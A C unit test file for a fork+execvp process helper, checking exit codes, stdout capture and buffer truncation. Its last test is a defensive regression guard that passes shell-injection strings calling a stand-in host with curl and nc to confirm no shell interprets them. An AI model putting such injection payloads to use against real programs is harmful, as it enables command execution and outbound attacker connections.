/**
 * @file test_ethercat_proc.c
 * @brief Unit tests for ecat_run_argv() — fork+execvp helper.
 *
 * Exercises spawning, exit-code propagation, and stdout capture using
 * standard Unix utilities (/bin/true, /bin/false, /bin/echo) so the
 * tests do not depend on plugin-specific binaries.
 */

#include "ethercat_proc.h"
#include "unity.h"

#include <string.h>

void setUp(void) {}
void tearDown(void) {}

/* ---- NULL guards ---- */

void test_run_argv_NullBin_ShouldFail(void)
{
    char *argv[] = { "true", NULL };
    TEST_ASSERT_EQUAL_INT(-1, ecat_run_argv(NULL, argv, NULL, 0));
}

void test_run_argv_NullArgv_ShouldFail(void)
{
    TEST_ASSERT_EQUAL_INT(-1, ecat_run_argv("/bin/true", NULL, NULL, 0));
}

/* ---- Exit status propagation ---- */

void test_run_argv_True_ShouldReturnZero(void)
{
    char *argv[] = { "/bin/true", NULL };
    TEST_ASSERT_EQUAL_INT(0, ecat_run_argv("/bin/true", argv, NULL, 0));
}

void test_run_argv_False_ShouldReturnOne(void)
{
    char *argv[] = { "/bin/false", NULL };
    TEST_ASSERT_EQUAL_INT(1, ecat_run_argv("/bin/false", argv, NULL, 0));
}

void test_run_argv_MissingBinary_ShouldReturn127(void)
{
    /* execvp fails in the child; the child _exit(127) per the helper's
     * convention -- same exit code POSIX shells use for "command not found". */
    char *argv[] = { "definitely_not_a_real_binary_xyzzy_42", NULL };
    TEST_ASSERT_EQUAL_INT(127,
        ecat_run_argv("definitely_not_a_real_binary_xyzzy_42", argv, NULL, 0));
}

/* ---- Stdout capture ---- */

void test_run_argv_Capture_ShouldReadStdout(void)
{
    char buf[64];
    memset(buf, 0xFF, sizeof(buf)); /* poison so a missing NUL is visible */
    char *argv[] = { "/bin/echo", "hello", NULL };

    int rc = ecat_run_argv("/bin/echo", argv, buf, sizeof(buf));

    TEST_ASSERT_EQUAL_INT(0, rc);
    /* /bin/echo appends a trailing newline. */
    TEST_ASSERT_EQUAL_STRING("hello\n", buf);
}

void test_run_argv_CaptureMultiArg_ShouldJoinWithSpaces(void)
{
    char buf[64];
    memset(buf, 0xFF, sizeof(buf));
    char *argv[] = { "/bin/echo", "foo", "bar", NULL };

    int rc = ecat_run_argv("/bin/echo", argv, buf, sizeof(buf));

    TEST_ASSERT_EQUAL_INT(0, rc);
    TEST_ASSERT_EQUAL_STRING("foo bar\n", buf);
}

void test_run_argv_CaptureSmallBuffer_ShouldTruncateAndNullTerminate(void)
{
    /* Buffer fits exactly 4 bytes plus the NUL.
     * /bin/echo emits "abcdefghij\n" -- we expect the first 4 chars
     * captured and a guaranteed NUL at buf[4]. */
    char buf[5];
    memset(buf, 0xFF, sizeof(buf));
    char *argv[] = { "/bin/echo", "abcdefghij", NULL };

    int rc = ecat_run_argv("/bin/echo", argv, buf, sizeof(buf));

    /* echo still exits 0 even though we drained only part of its stdout. */
    TEST_ASSERT_EQUAL_INT(0, rc);
    TEST_ASSERT_EQUAL_INT('\0', buf[4]);
    TEST_ASSERT_EQUAL_INT(4, (int)strlen(buf));
    TEST_ASSERT_EQUAL_STRING("abcd", buf);
}

void test_run_argv_NoCaptureBuffer_ShouldStillRun(void)
{
    /* When capture_buf is NULL but capture_size is non-zero, the helper
     * should treat it as no-capture (stdout to /dev/null). */
    char *argv[] = { "/bin/echo", "discarded", NULL };
    int rc = ecat_run_argv("/bin/echo", argv, NULL, 64);
    TEST_ASSERT_EQUAL_INT(0, rc);
}

void test_run_argv_ZeroCaptureSize_ShouldNotCapture(void)
{
    /* capture_size == 0 with non-NULL buffer -- helper treats this as
     * no-capture (the only sane reading -- otherwise we'd write past
     * the zero-length buffer). */
    char buf[1] = { 0x42 };
    char *argv[] = { "/bin/echo", "anything", NULL };

    int rc = ecat_run_argv("/bin/echo", argv, buf, 0);

    TEST_ASSERT_EQUAL_INT(0, rc);
    /* Buffer untouched. */
    TEST_ASSERT_EQUAL_INT(0x42, (unsigned char)buf[0]);
}

/* ---- Defense in depth: no shell interpretation of argv ---- */

void test_run_argv_ShellMetacharsInArgv_AreLiteralArguments(void)
{
    /* The whole point of using fork+execvp instead of system() is that
     * argv elements are passed verbatim, never parsed by a shell. If a
     * future refactor reintroduces system()/popen()/sh -c, /bin/echo
     * would receive different arguments (or none) and this test would
     * fail. Treat it as a regression guard.
     *
     * /bin/echo is a real binary (not a shell built-in here), so any
     * substitution we observe in stdout must have come from a shell. */
    char buf[256];
    memset(buf, 0xFF, sizeof(buf));
    char *argv[] = {
        "/bin/echo",
        "; touch /tmp/ecat_run_argv_pwned",
        "$(whoami)",
        "`id`",
        "&& curl evil.example",
        "| nc evil.example 1337",
        NULL
    };

    int rc = ecat_run_argv("/bin/echo", argv, buf, sizeof(buf));

    TEST_ASSERT_EQUAL_INT(0, rc);
    /* /bin/echo joins with single spaces and appends a newline.
     * Every token must reappear exactly as passed -- no expansion. */
    TEST_ASSERT_EQUAL_STRING(
        "; touch /tmp/ecat_run_argv_pwned $(whoami) `id` "
        "&& curl evil.example | nc evil.example 1337\n",
        buf);
}
